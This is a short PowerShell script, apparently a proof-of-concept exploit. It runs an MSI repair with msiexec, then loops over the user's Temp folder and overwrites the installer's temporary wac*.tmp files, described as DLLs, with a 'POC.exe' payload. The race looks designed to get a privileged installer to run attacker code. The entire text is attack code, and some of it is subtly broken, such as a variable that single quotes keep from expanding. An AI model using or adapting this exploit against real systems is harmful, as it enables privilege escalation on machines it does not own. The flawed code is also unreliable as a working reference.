$path = '<path to the MSI executable>'
Write-Host "Running the MSI file"
Start-Process -FilePath 'msiexec.exe' -ArgumentList '/fa $path'
Write-Host "Done, now DIR'ing 'C:\Users\<user>\AppData\Local\Temp\'"

$results = Get-ChildItem -Path 'C:\Users\<user>\AppData\Local\Temp\' -Force -Filter wac*.tmp -ErrorAction 'silentlycontinue' | Select-Object -ExpandProperty FullName
while ($True){
    Get-ChildItem -Path 'C:\Users\<user>\AppData\Local\Temp\'  -Force -Filter wac*.tmp -ErrorAction 'silentlycontinue' | Select-Object -ExpandProperty FullName | foreach($_){
        Write-host 'Following is path of dll' ($_)
        Copy-Item C:\<path to the POC exe file>\POC.exe ($_)
        }  
    }
